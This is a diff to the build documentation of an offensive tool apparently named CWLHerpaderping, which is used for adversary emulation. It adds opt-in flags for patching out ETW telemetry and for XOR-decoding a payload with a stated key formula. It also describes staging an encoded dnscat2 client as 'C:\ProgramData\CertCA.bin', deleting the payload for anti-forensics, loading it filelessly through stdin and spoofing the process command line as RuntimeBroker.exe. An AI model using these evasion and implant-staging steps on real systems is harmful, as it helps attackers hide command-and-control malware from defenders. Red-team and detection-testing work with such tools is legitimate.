@@ -119,22 +119,67 @@ msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:CustomPa
 
 ### ETW Patching (Compile-Time, Opt-In)
 
-ETW patching (`T1562.006`) is **disabled by default**. To enable it, pass `ENABLE_ETW_PATCH` as a preprocessor definition:
+ETW patching (`T1562.006`) is **disabled by default**. To enable it, pass `/p:ETWPatch=1`:
 
 ```bash
 # Build WITH ETW patching (T1562.006 active)
-msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:PreprocessorDefinitions="ENABLE_ETW_PATCH"
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:ETWPatch=1
 
 # Build WITHOUT ETW patching (default — cleaner profile)
 msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64
 
 # Combine with custom payload path
-msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:PreprocessorDefinitions="ENABLE_ETW_PATCH" /p:CustomPayloadPath="C:\\temp\\implant.exe"
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:ETWPatch=1 /p:CustomPayloadPath="C:\\temp\\implant.exe"
 ```
 
 **When to enable:**
 - Lab environments where ETW-based detection coverage needs to be tested
 - Scenarios explicitly emulating T1562.006
+
+---
+
+### XOR Payload Decode (Compile-Time, Opt-In)
+
+XOR decode (`T1027.013`) is **disabled by default**. When enabled, `GetPayloadBuffer()` applies a position-dependent XOR decode to the payload buffer immediately after reading from disk **(Mode 2 / file path only — Mode 1 stdin is unaffected)**.
+
+Formula: `decoded[i] = encoded[i] ^ ((0xA3 + i * 0x5B) & 0xFF)`
+
+Enable with `/p:PayloadXOR=1`:
+
+```bash
+# Build WITH XOR decode active (T1027.013)
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:PayloadXOR=1
+
+# Full Phase 1A production build (XOR + custom payload path)
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 \
+    /p:PayloadXOR=1 \
+    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin"
+
+# All opt-ins combined (XOR + ETW + custom path)
+msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 \
+    /p:PayloadXOR=1 /p:ETWPatch=1 \
+    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin"
+```
+
+**Encode dnscat2 payload before staging (Python side):**
+
+```bash
+python resources/payloads/react2shell-tool/encrypt_payload_xor.py \
+    resources/payloads/dnscat2/go-client/dnscat2.exe -o CertCA.bin
+# Verify: first byte should be 0xEE (0x4D ^ 0xA3)
+```
+
+Or via react2shell `stage --encrypt`:
+
+```
+stage --encrypt ../dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.bin
+```
+
+**When to enable:**
+- Production emulation runs where `CertCA.bin` must not have a valid MZ header on disk
+- Scenarios explicitly emulating T1027.013 (Encrypted/Encoded File)
+
+---
 
 ## Example Build Commands
 
@@ -159,7 +204,9 @@ msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /t:Build
 
 ## Notes
 
-- Payload file must exist before running CWLHerpaderping.exe
-- The payload file will be **automatically deleted** after reading (anti-forensics feature)
+- Payload file must exist before running in Mode 2 (no stdin pipe); deleted immediately after read (T1070.004)
+- Mode 1 (stdin pipe): parent spawns the binary with stdin redirected; format = `[4-byte LE size][PE bytes]` — no file on disk (T1620)
+- Ghost process PEB `CommandLine` is always hardcoded to `RuntimeBroker.exe` (set via `RtlCreateProcessParametersEx`)
 - Release build is recommended for production/testing
-- Debug build is useful for debugging and development
+- Debug build (`/p:CWLDebug=1`) prints runtime progress to stdout — useful during development
+- Entry point is `wmain()` (no arguments) — no explicit `/ENTRY` linker flag needed; MSVC CRT automatically uses `wmainCRTStartup`
